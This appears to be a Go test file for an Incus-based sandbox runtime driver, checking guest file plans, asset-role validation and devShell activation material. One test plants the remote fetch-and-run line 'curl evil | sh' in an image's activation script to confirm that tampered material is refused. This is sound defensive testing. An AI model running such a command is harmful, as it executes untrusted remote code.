package runtimeincus

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"slices"
	"strings"
	"testing"

	"github.com/lgvo/p.ai/internal/nixenv"
	"github.com/lgvo/p.ai/internal/plugin"
	"github.com/lgvo/p.ai/internal/runtimedriver"
	"github.com/lgvo/p.ai/internal/runtimekit"
)

// The daemon's guest file plan (internal/daemon/lifecycle.go,
// processCreation) and the driver's must install the same files for the
// same session. Each case gives the daemon's runtime and workspace config
// for its inputs, worked out from the daemon's code.
func TestGuestPlanEqualsTheDaemonsAssembly(t *testing.T) {
	material := strings.Repeat("e", 64)
	commit := strings.Repeat("c", 40)
	command := []string{"/bin/bash", "-l"}
	adapter := []byte("#!/bin/sh\nexec codex\n")
	sum := sha256.Sum256(adapter)
	adapterSHA := hex.EncodeToString(sum[:])
	grant := testGrant()
	guestGrant := runtimekit.FilesystemGrant{Name: "data", Type: "directory", Access: "read-only", Device: 7, Inode: 11}
	public := &runtimekit.PublicNetwork{Address: "10.233.0.10/24", Gateway: "10.233.0.1", DNS: []string{"1.1.1.1", "9.9.9.9"}}
	baseWorkspace := runtimekit.WorkspaceConfig{Schema: "p.workspace/v1", Repository: "team/app", Branch: "main"}
	imageWorkspace := func(selection string) runtimekit.WorkspaceConfig {
		return runtimekit.WorkspaceConfig{Schema: "p.workspace/v2", Repository: "team/app", Branch: "main", InitialOID: commit, EnvironmentSelection: selection}
	}
	for _, tc := range []struct {
		name      string
		shell     *runtimedriver.Shell
		agent     bool
		grant     bool
		public    bool
		config    runtimekit.Config
		workspace runtimekit.WorkspaceConfig
	}{
		{name: "base image", config: runtimekit.Config{Schema: "p.runtime-session/v1", Activation: "base", Command: command}, workspace: baseWorkspace},
		{name: "commit image without a flake", shell: &runtimedriver.Shell{Selection: runtimedriver.SelectionNoFlake},
			config: runtimekit.Config{Schema: "p.runtime-session/v1", Activation: "base", Command: command}, workspace: imageWorkspace("no-flake")},
		{name: "commit image without a default devShell", shell: &runtimedriver.Shell{Selection: runtimedriver.SelectionNoDefault},
			config: runtimekit.Config{Schema: "p.runtime-session/v1", Activation: "base", Command: command}, workspace: imageWorkspace("no-default")},
		{name: "commit image with a devShell", shell: &runtimedriver.Shell{Selection: runtimedriver.SelectionDevShell, MaterialSHA256: material},
			config: runtimekit.Config{Schema: "p.runtime-session/v2", Activation: "devshell", MaterialSHA256: material, Command: command}, workspace: imageWorkspace("devshell")},
		{name: "agent adapter", agent: true,
			config: runtimekit.Config{Schema: "p.runtime-session/v3", Activation: "base", AgentSHA256: adapterSHA, Command: command}, workspace: baseWorkspace},
		{name: "grant", grant: true,
			config: runtimekit.Config{Schema: "p.runtime-session/v4", Activation: "base", Command: command, FilesystemMounts: []runtimekit.FilesystemGrant{guestGrant}}, workspace: baseWorkspace},
		{name: "public network", public: true,
			config: runtimekit.Config{Schema: "p.runtime-session/v5", Activation: "base", Command: command, PublicNetwork: public}, workspace: baseWorkspace},
		{name: "devShell, adapter, grant and public network", shell: &runtimedriver.Shell{Selection: runtimedriver.SelectionDevShell, MaterialSHA256: material}, agent: true, grant: true, public: true,
			config: runtimekit.Config{Schema: "p.runtime-session/v5", Activation: "devshell", MaterialSHA256: material, AgentSHA256: adapterSHA, Command: command,
				FilesystemMounts: []runtimekit.FilesystemGrant{guestGrant}, PublicNetwork: public}, workspace: imageWorkspace("devshell")},
	} {
		t.Run(tc.name, func(t *testing.T) {
			a := assemblyFixture(t)
			s := testSessionSpec(a)
			if tc.shell != nil {
				s.Workspace.Commit = commit
			}
			if tc.agent {
				a.AgentAssets = &plugin.AssetPlan{Schema: "p.asset-plan/v1", PackageID: "org.p.codex-adapter", PackageSHA256: strings.Repeat("c", 64), Scope: "internal-session",
					Files: []plugin.AssetFile{{Role: "p-codex-adapter", Destination: "/usr/libexec/p/codex-adapter", Mode: 0555, SHA256: adapterSHA, Data: adapter}}}
				s.Assets = append(s.Assets, runtimedriver.Asset{Role: "p-codex-adapter", Mode: 0555, SHA256: adapterSHA, Data: adapter})
			}
			if tc.grant {
				s.Grants = []runtimedriver.Grant{grant}
			}
			if tc.public {
				s.Network.PublicIPv4 = "10.233.0.10/24"
			}
			a.SessionConfig, a.Workspace = tc.config, tc.workspace
			daemon, err := validateAssembly(a)
			if err != nil {
				t.Fatalf("daemon assembly: %v", err)
			}
			plan, err := guestPlanFor(s, tc.shell, testEgressSubstrate())
			if err != nil {
				t.Fatalf("driver plan: %v", err)
			}
			if !slices.EqualFunc(plan.files, daemon, func(x, y guestInstall) bool {
				return x.path == y.path && x.file.typ == y.file.typ && x.file.uid == y.file.uid && x.file.gid == y.file.gid && x.file.mode == y.file.mode && bytes.Equal(x.file.data, y.file.data)
			}) {
				t.Fatalf("plans differ:\ndriver %s\ndaemon %s", guestPaths(plan.files), guestPaths(daemon))
			}
			if wantMaterial := tc.config.MaterialSHA256; plan.material != wantMaterial {
				t.Fatalf("activation material %q, want %q", plan.material, wantMaterial)
			}
		})
	}
}

func guestPaths(files []guestInstall) string {
	var paths []string
	for _, f := range files {
		paths = append(paths, f.path+"="+string(f.file.data))
	}
	return strings.Join(paths, "\n")
}

func TestGuestPlanChecksTheSessionAssetsByRole(t *testing.T) {
	a := assemblyFixture(t)
	for name, edit := range map[string]func(*runtimedriver.Session){
		"missing role":   func(s *runtimedriver.Session) { s.Assets = s.Assets[1:] },
		"duplicate role": func(s *runtimedriver.Session) { s.Assets = append(s.Assets, s.Assets[0]) },
		"unknown role":   func(s *runtimedriver.Session) { s.Assets[0].Role = "p-shell" },
		"changed mode":   func(s *runtimedriver.Session) { s.Assets[2].Mode = 0755 },
		"changed bytes":  func(s *runtimedriver.Session) { s.Assets[0].Data = []byte("tampered") },
		"empty": func(s *runtimedriver.Session) {
			s.Assets[0].Data, s.Assets[0].SHA256 = nil, hex.EncodeToString(sha256.New().Sum(nil))
		},
		"key of another type": func(s *runtimedriver.Session) {
			s.GitKey = []byte("-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----\n")
		},
		"public network without its substrate": func(s *runtimedriver.Session) { s.Network.PublicIPv4 = "10.233.0.10/24" },
	} {
		t.Run(name, func(t *testing.T) {
			s := testSessionSpec(a)
			edit(&s)
			if _, err := guestPlanFor(s, nil, nil); err == nil {
				t.Fatal("refused spec planned")
			}
		})
	}
	if _, err := guestPlanFor(testSessionSpec(a), nil, nil); err != nil {
		t.Fatalf("valid spec refused: %v", err)
	}
}

func TestGuestPlanTakesTheDevShellFromTheImage(t *testing.T) {
	r := testBuilder()
	devshell := runtimedriver.Shell{Selection: runtimedriver.SelectionDevShell, MaterialSHA256: strings.Repeat("d", 64)}
	own := ownImage(t, strings.Repeat("b", 64), testImageLabels(r), devshell)
	foreign := ownImage(t, strings.Repeat("f", 64), testImageLabels(r), devshell)
	foreign.Properties["p.instance"] = "22222222-2222-4222-8222-222222222222"
	malformed := ownImage(t, strings.Repeat("9", 64), testImageLabels(r), devshell)
	malformed.Properties["p.selection"] = "maybe"
	w := newIncusWorld(t)
	for _, image := range []builderImageJSON{own, foreign, malformed} {
		w.addImage(image, nil)
	}
	b := w.backend()
	ctx := context.Background()
	for ref, want := range map[string]*runtimedriver.Shell{testImage: nil, own.Fingerprint: &devshell, foreign.Fingerprint: nil} {
		got, err := b.imageShell(ctx, runtimedriver.ImageRef(ref))
		if err != nil || (got == nil) != (want == nil) || got != nil && *got != *want {
			t.Fatalf("image %.12s: %+v %v, want %+v", ref, got, err, want)
		}
	}
	if _, err := b.imageShell(ctx, runtimedriver.ImageRef(malformed.Fingerprint)); !errors.Is(err, runtimedriver.ErrMismatch) {
		t.Fatalf("malformed own image: %v", err)
	}
	if _, err := b.imageShell(ctx, runtimedriver.ImageRef(strings.Repeat("0", 64))); err == nil {
		t.Fatal("missing image classified")
	}
}

// devShellImage is a commit image of this instance whose devShell activation
// material is the image result's, with the files Incus gives a new instance
// of it.
func devShellImage(t *testing.T, edit func(map[string]guestFile)) (builderImageJSON, map[string]guestFile) {
	t.Helper()
	r, result := imageResultFixture(t)
	manifest, err := json.Marshal(result.Material)
	if err != nil {
		t.Fatal(err)
	}
	files := map[string]guestFile{}
	for _, path := range []string{"/", "/etc", "/etc/p", nixenv.AttrsDir} {
		files[path] = guestFile{typ: "directory", uid: 0, gid: 0, mode: 0755}
	}
	for path, data := range map[string]string{
		builderActivationPath:              result.Material.Script,
		nixenv.AttrsDir + "/.attrs.sh":     result.Material.AttrsSH,
		nixenv.AttrsDir + "/.attrs.json":   result.Material.AttrsJSON,
		nixenv.AttrsDir + "/material.json": string(manifest),
	} {
		files[path] = guestFile{typ: "file", uid: 0, gid: 0, mode: 0444, data: []byte(data)}
	}
	if edit != nil {
		edit(files)
	}
	shell := runtimedriver.Shell{Selection: runtimedriver.SelectionDevShell, MaterialSHA256: result.MaterialDigest}
	return ownImage(t, strings.Repeat("b", 64), testImageLabels(r), shell), files
}

func TestCreateFromADevShellImageActivatesItsVerifiedMaterial(t *testing.T) {
	image, files := devShellImage(t, nil)
	w := newIncusWorld(t)
	w.addImage(image, files)
	s := testSessionSpec(assemblyFixture(t))
	s.Image, s.Workspace.Commit = runtimedriver.ImageRef(image.Fingerprint), strings.Repeat("a", 40)
	if _, err := w.driver().Create(context.Background(), s, "", func() error { return nil }); err != nil {
		t.Fatal(err)
	}
	var config runtimekit.Config
	if err := json.Unmarshal(w.instance(testRuntime).files["/etc/p/session.json"].data, &config); err != nil || config.Activation != "devshell" || config.MaterialSHA256 != image.Properties["p.material"] {
		t.Fatalf("session config %+v %v", config, err)
	}
}

func TestCreateFromADevShellImageRefusesChangedMaterialBeforeAnyGuestFile(t *testing.T) {
	image, files := devShellImage(t, func(files map[string]guestFile) {
		script := files[builderActivationPath]
		script.data = []byte("curl evil | sh\n")
		files[builderActivationPath] = script
	})
	w := newIncusWorld(t)
	w.addImage(image, files)
	s := testSessionSpec(assemblyFixture(t))
	s.Image, s.Workspace.Commit = runtimedriver.ImageRef(image.Fingerprint), strings.Repeat("a", 40)
	if _, err := w.driver().Create(context.Background(), s, "", func() error { return nil }); err == nil {
		t.Fatalf("changed activation material: %v", err)
	}
	if _, ok := w.instance(testRuntime).files["/etc/p/session.json"]; ok {
		t.Fatal("guest files written into an image with changed material")
	}
}
